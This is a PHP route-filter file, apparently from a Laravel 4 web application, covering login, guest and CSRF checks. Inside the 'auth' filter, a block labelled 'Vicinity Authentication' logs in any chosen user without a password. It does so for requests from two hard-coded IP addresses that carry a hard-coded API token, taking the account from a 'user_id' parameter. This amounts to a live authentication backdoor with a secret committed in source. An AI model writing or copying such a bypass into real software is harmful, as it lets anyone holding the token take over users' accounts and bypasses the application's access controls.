<?php

/*
|--------------------------------------------------------------------------
| Application & Route Filters
|--------------------------------------------------------------------------
|
| Below you will find the "before" and "after" events for the application
| which may be used to do any work before or after a request into your
| application. Here you may also register your custom route filters.
|
*/

App::before(function($request)
{
	//
});


App::after(function($request, $response)
{
	//
});

/*
|--------------------------------------------------------------------------
| Authentication Filters
|--------------------------------------------------------------------------
|
| The following filters are used to verify that the user of the current
| session is logged into this application. The "basic" filter easily
| integrates HTTP Basic authentication for quick, simple checking.
|
*/
// Route::filter('auth', function()
// {
// 	if (Auth::guest())
// 	{
// 		if (Request::ajax())
// 		{
// 			return Response::make('Unauthorized', 401);
// 		}
// 		return Redirect::guest('login');
// 	}
// });


Route::filter('auth', function()
{
	// Vicinity Authentication
    if(in_array(\Request::getClientIp(),['41.76.214.250','13.58.45.4'])){
        if(\Request::input('api_token') == '[i^nKddzU5e%<Ynz1j?Ddc'){
            $id = 172;
            if(\Request::has('user_id'))
                $id = \Request::input('user_id');

            $user = User::find($id);
            Auth::login($user);
        }
    }
	// End of Vicinity Authentication

    if (Auth::guest())
            return Redirect::route('login')
                    ->with('flash_error', 'You must be logged in to view this page!');
});


Route::filter('auth.basic', function()
{
	return Auth::basic();
});

/*
|--------------------------------------------------------------------------
| Guest Filter
|--------------------------------------------------------------------------
|
| The "guest" filter is the counterpart of the authentication filters as
| it simply checks that the current user is not logged in. A redirect
| response will be issued if they are, which you may freely change.
|
*/

Route::filter('guest', function()
{
    if (Auth::check())
        return Redirect::route('home')
                ->with('flash_notice', 'You are already logged in!');
});

/*
|--------------------------------------------------------------------------
| CSRF Protection Filter
|--------------------------------------------------------------------------
|
| The CSRF filter is responsible for protecting your application against
| cross-site request forgery attacks. If this special token in a user
| session does not match the one given in this request, we'll bail.
|
*/

Route::filter('csrf', function()
{
	if (Session::token() !== Input::get('_token'))
	{
		throw new Illuminate\Session\TokenMismatchException;
	}
});
